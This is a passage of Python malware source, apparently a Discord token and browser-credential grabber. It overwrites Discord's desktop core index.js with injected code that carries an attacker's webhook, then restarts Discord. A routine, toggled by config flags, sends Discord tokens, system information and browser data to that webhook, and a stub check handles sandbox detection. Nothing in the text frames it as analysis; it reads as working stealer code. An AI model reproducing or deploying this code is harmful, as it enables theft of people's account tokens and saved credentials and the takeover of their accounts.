                    proc.kill()
        except:
            pass

        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue

            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write((self.code).replace('discord_desktop_core-1',
                            self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                    self.start_discord(dir)

    def get_core(self, dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue

                        return core, file

    def start_discord(self, dir: str) -> None:
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update, '--processStart', executable],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                            


def RunSandbox():
    if check.__read__() == True:
        struct = __config__
        webhook_url = js_bot.js_webhook
        try:
            protect_proc.__init__()
        except:
            pass

        # ! OPTICAL ! #
        if struct.__injection__ == "y" or struct.__hook__ == "y" or struct.__injection__ == "Y" or struct.__hook__ == "Y":
            Injection(webhook=webhook_url)
            time.sleep(1)
            dHook.DiscordToken(webhook=webhook_url)

        if struct.__sysHook__ == "y" or struct.__sysHook__ == "Y":
            sysHook.SystemInfo(webhook=webhook_url)

        if struct.__browserHook__ == "y" or struct.__browserHook__ == "Y":
            print()
            bHook.Browsers(webhook=webhook_url)

        # ! OPTICAL-W ! #
        if struct.__runonce__ == "y" or struct.__runonce__ == "Y":
            sv = check.__write__()
    else:
        pass
    # CONTINUE SRC #

class vm:
    def excsrc():
        vmSandbox=bool(False)
        if vmSandbox == bool(True):
            try:
                RunSandbox()
            except:
                pass
        else:
            RunSandbox()

if __name__=="__main__":
    vm.excsrc()